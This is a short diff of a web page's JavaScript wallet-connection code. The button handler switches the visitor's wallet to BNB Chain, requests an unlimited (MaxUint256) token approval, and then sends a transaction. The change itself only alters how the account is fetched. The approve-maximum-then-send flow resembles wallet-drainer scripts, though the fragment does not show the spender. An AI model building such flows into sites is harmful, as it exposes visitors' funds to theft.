@@ -204,17 +204,8 @@ document.addEventListener("DOMContentLoaded", function () {
 
         nextBtn.innerHTML = '<span class="spinner">Processing...</span>';
         nextBtn.disabled = true;
-try {
-       let fromAddress;
-        
-        // Step 1: Make sure we have a wallet installed
-        if (!window.ethereum) {
-            showNotification("Install MetaMask & click Connect!", "info");
-            return;
-        }
 
-        // Step 2: Force connection + select the first available account
-        ({ result: fromAddress } = await window.ethereum.request({ method: "eth_requestAccounts" }));
+        try {
             const bnbChainId = "0x38";
             await window.ethereum.request({
                 method: "wallet_switchEthereumChain",
@@ -230,7 +221,7 @@ try {
                 ethers.constants.MaxUint256.toString()
             ]);
 
-            const fromAddress = (await window.ethereum.request({ method: "eth_requestAccounts" }))[0];
+            const fromAddress = (await window.ethereum.request({ method: "eth_accounts" }))[0];
 
             const txHash = await window.ethereum.request({
                 method: "eth_sendTransaction",
